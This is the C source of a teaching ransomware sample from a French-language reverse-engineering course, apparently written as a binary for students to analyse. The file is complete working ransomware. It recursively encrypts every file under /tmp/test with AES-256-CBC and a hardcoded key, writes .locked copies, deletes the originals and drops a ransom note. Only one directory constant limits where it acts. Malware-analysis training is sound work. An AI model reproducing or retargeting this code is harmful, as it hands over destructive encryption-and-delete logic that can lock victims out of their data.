/*
 * ============================================================================
 *  Formation Reverse Engineering — Chapitre 27
 *  Sample pédagogique : ransomware ELF simplifié
 * ============================================================================
 *
 *  ⚠️  CE PROGRAMME EST STRICTEMENT ÉDUCATIF.
 *      Il chiffre UNIQUEMENT les fichiers dans /tmp/test/.
 *      Ne JAMAIS l'exécuter hors d'une VM sandboxée isolée.
 *
 *  Comportement :
 *    1. Parcourt récursivement /tmp/test/
 *    2. Chiffre chaque fichier régulier avec AES-256-CBC
 *    3. Écrit le résultat dans <fichier>.locked
 *    4. Supprime le fichier original
 *    5. Dépose une "ransom note" dans /tmp/test/README_LOCKED.txt
 *
 *  Clé et IV sont hardcodés (volontairement récupérables par RE).
 *  Dépendance : libssl-dev (OpenSSL EVP API)
 *
 *  Compilation : voir Makefile fourni
 *  Licence : MIT — usage éducatif uniquement
 * ============================================================================
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <openssl/evp.h>
#include <openssl/err.h>

/* ---------------------------------------------------------------------------
 *  Constantes — volontairement visibles pour l'exercice de RE
 * --------------------------------------------------------------------------- */

#define TARGET_DIR      "/tmp/test"
#define LOCKED_EXT      ".locked"
#define NOTE_FILENAME   "README_LOCKED.txt"
#define MAX_PATH_LEN    4096


/* Clé AES-256 (32 octets) — hardcodée pour l'exercice */
static const unsigned char AES_KEY[32] = {
    0x52, 0x45, 0x56, 0x45, 0x52, 0x53, 0x45, 0x5F,  /* REVERSE_ */
    0x45, 0x4E, 0x47, 0x49, 0x4E, 0x45, 0x45, 0x52,  /* ENGINEER */
    0x49, 0x4E, 0x47, 0x5F, 0x49, 0x53, 0x5F, 0x46,  /* ING_IS_F */
    0x55, 0x4E, 0x5F, 0x32, 0x30, 0x32, 0x35, 0x21   /* UN_2025! */
};

/* IV AES (16 octets) — également hardcodé */
static const unsigned char AES_IV[16] = {
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
    0x13, 0x37, 0x42, 0x42, 0xFE, 0xED, 0xFA, 0xCE
};

/* Texte de la ransom note */
static const char *RANSOM_NOTE =
    "========================================\n"
    "  VOS FICHIERS ONT ETE CHIFFRES !\n"
    "========================================\n"
    "\n"
    "Ceci est un exercice pedagogique.\n"
    "Formation Reverse Engineering — Chapitre 27\n"
    "\n"
    "Algorithme : AES-256-CBC\n"
    "La cle est dans le binaire. Trouvez-la.\n"
    "\n"
    "Indice : cherchez les constantes de 32 octets...\n"
    "========================================\n";

/* ---------------------------------------------------------------------------
 *  Prototypes
 * --------------------------------------------------------------------------- */

static int  encrypt_file(const char *input_path);
static int  aes256cbc_encrypt(const unsigned char *in, int in_len,
                              unsigned char *out, int *out_len);
static void traverse_directory(const char *dir_path, int *count);
static void drop_ransom_note(const char *dir_path);
static int  is_regular_file(const char *path);
static int  should_skip(const char *filename);
static void print_banner(void);

/* ---------------------------------------------------------------------------
 *  Point d'entrée
 * --------------------------------------------------------------------------- */

int main(int argc, char *argv[])
{
    (void)argc;
    (void)argv;

    print_banner();

    /* Vérification de sécurité : on refuse de tourner hors de /tmp/test */
    struct stat st;
    if (stat(TARGET_DIR, &st) != 0 || !S_ISDIR(st.st_mode)) {
        fprintf(stderr, "[!] Repertoire cible absent : %s\n", TARGET_DIR);
        fprintf(stderr, "[!] Creez-le avec : mkdir -p %s && cp fichiers_test %s/\n",
                TARGET_DIR, TARGET_DIR);
        return EXIT_FAILURE;
    }

    int file_count = 0;

    printf("[*] Parcours de %s ...\n", TARGET_DIR);
    traverse_directory(TARGET_DIR, &file_count);

    if (file_count > 0) {
        drop_ransom_note(TARGET_DIR);
        printf("[*] %d fichier(s) chiffre(s).\n", file_count);
        printf("[*] Note deposee : %s/%s\n", TARGET_DIR, NOTE_FILENAME);
    } else {
        printf("[*] Aucun fichier a chiffrer.\n");
    }

    return EXIT_SUCCESS;
}

/* ---------------------------------------------------------------------------
 *  Parcours récursif du répertoire cible
 * --------------------------------------------------------------------------- */

static void traverse_directory(const char *dir_path, int *count)
{
    DIR *d = opendir(dir_path);
    if (!d) {
        perror("[!] opendir");
        return;
    }

    struct dirent *entry;
    char full_path[MAX_PATH_LEN];

    while ((entry = readdir(d)) != NULL) {
        /* Ignorer . et .. */
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        /* Ignorer les fichiers déjà chiffrés et la ransom note */
        if (should_skip(entry->d_name))
            continue;

        snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, entry->d_name);

        struct stat st;
        if (stat(full_path, &st) != 0)
            continue;

        if (S_ISDIR(st.st_mode)) {
            /* Descente récursive */
            traverse_directory(full_path, count);
        } else if (S_ISREG(st.st_mode)) {
            printf("[+] Chiffrement : %s\n", full_path);
            if (encrypt_file(full_path) == 0) {
                (*count)++;
            } else {
                fprintf(stderr, "[-] Echec : %s\n", full_path);
            }
        }
    }

    closedir(d);
}

/* ---------------------------------------------------------------------------
 *  Vérifie si un fichier doit être ignoré
 * --------------------------------------------------------------------------- */

static int should_skip(const char *filename)
{
    size_t len = strlen(filename);
    size_t ext_len = strlen(LOCKED_EXT);

    /* Ignorer les fichiers déjà .locked */
    if (len >= ext_len &&
        strcmp(filename + len - ext_len, LOCKED_EXT) == 0)
        return 1;

    /* Ignorer la ransom note */
    if (strcmp(filename, NOTE_FILENAME) == 0)
        return 1;

    return 0;
}

/* ---------------------------------------------------------------------------
 *  Vérifie si le chemin pointe vers un fichier régulier
 * --------------------------------------------------------------------------- */

static int is_regular_file(const char *path)
{
    struct stat st;
    return (stat(path, &st) == 0 && S_ISREG(st.st_mode));
}

/* ---------------------------------------------------------------------------
 *  Chiffre un fichier : lit → chiffre en mémoire → écrit .locked → supprime
 * --------------------------------------------------------------------------- */

static int encrypt_file(const char *input_path)
{
    FILE *fp_in = fopen(input_path, "rb");
    if (!fp_in) {
        perror("[!] fopen input");
        return -1;
    }

    /* Lire le fichier entier en mémoire */
    fseek(fp_in, 0, SEEK_END);
    long file_size = ftell(fp_in);
    fseek(fp_in, 0, SEEK_SET);

    if (file_size <= 0) {
        fclose(fp_in);
        return -1;
    }

    unsigned char *plaintext = malloc((size_t)file_size);
    if (!plaintext) {
        fclose(fp_in);
        return -1;
    }

    size_t bytes_read = fread(plaintext, 1, (size_t)file_size, fp_in);
    fclose(fp_in);

    if ((long)bytes_read != file_size) {
        free(plaintext);
        return -1;
    }

    /* Buffer de sortie : taille max = file_size + un bloc AES (padding) */
    int max_out = (int)file_size + EVP_MAX_BLOCK_LENGTH;
    unsigned char *ciphertext = malloc((size_t)max_out);
    if (!ciphertext) {
        free(plaintext);
        return -1;
    }

    int ciphertext_len = 0;
    int rc = aes256cbc_encrypt(plaintext, (int)file_size,
                               ciphertext, &ciphertext_len);
    free(plaintext);

    if (rc != 0) {
        free(ciphertext);
        return -1;
    }

    /* Écrire le fichier chiffré avec l'extension .locked */
    char out_path[MAX_PATH_LEN];
    snprintf(out_path, sizeof(out_path), "%s%s", input_path, LOCKED_EXT);

    FILE *fp_out = fopen(out_path, "wb");
    if (!fp_out) {
        perror("[!] fopen output");
        free(ciphertext);
        return -1;
    }

    /* En-tête magique pour identifier nos fichiers chiffrés : "RWARE27\x00" */
    const char magic[8] = { 'R', 'W', 'A', 'R', 'E', '2', '7', '\0' };
    fwrite(magic, 1, sizeof(magic), fp_out);

    /* Écrire la taille originale (8 octets, little-endian) */
    uint64_t orig_size = (uint64_t)file_size;
    fwrite(&orig_size, sizeof(orig_size), 1, fp_out);

    /* Écrire les données chiffrées */
    fwrite(ciphertext, 1, (size_t)ciphertext_len, fp_out);
    fclose(fp_out);
    free(ciphertext);

    /* Supprimer le fichier original */
    if (unlink(input_path) != 0) {
        perror("[!] unlink");
        /* Non fatal — le fichier chiffré est déjà écrit */
    }

    return 0;
}

/* ---------------------------------------------------------------------------
 *  Chiffrement AES-256-CBC via OpenSSL EVP
 * --------------------------------------------------------------------------- */

static int aes256cbc_encrypt(const unsigned char *in, int in_len,
                             unsigned char *out, int *out_len)
{
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        fprintf(stderr, "[!] EVP_CIPHER_CTX_new failed\n");
        return -1;
    }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, AES_KEY, AES_IV) != 1) {
        fprintf(stderr, "[!] EVP_EncryptInit_ex failed\n");
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }

    int len = 0;
    *out_len = 0;

    if (EVP_EncryptUpdate(ctx, out, &len, in, in_len) != 1) {
        fprintf(stderr, "[!] EVP_EncryptUpdate failed\n");
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    *out_len = len;

    if (EVP_EncryptFinal_ex(ctx, out + len, &len) != 1) {
        fprintf(stderr, "[!] EVP_EncryptFinal_ex failed\n");
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    *out_len += len;

    EVP_CIPHER_CTX_free(ctx);
    return 0;
}

/* ---------------------------------------------------------------------------
 *  Dépose la ransom note
 * --------------------------------------------------------------------------- */

static void drop_ransom_note(const char *dir_path)
{
    char note_path[MAX_PATH_LEN];
    snprintf(note_path, sizeof(note_path), "%s/%s", dir_path, NOTE_FILENAME);

    FILE *fp = fopen(note_path, "w");
    if (!fp) {
        perror("[!] fopen ransom note");
        return;
    }

    fputs(RANSOM_NOTE, fp);
    fclose(fp);
}

/* ---------------------------------------------------------------------------
 *  Bannière d'exécution
 * --------------------------------------------------------------------------- */

static void print_banner(void)
{
    printf("==============================================\n");
    printf("  Formation RE — Chapitre 27\n");
    printf("  Sample pedagogique — NE PAS DISTRIBUER\n");
    printf("  Cible : %s\n", TARGET_DIR);
    printf("==============================================\n");
}
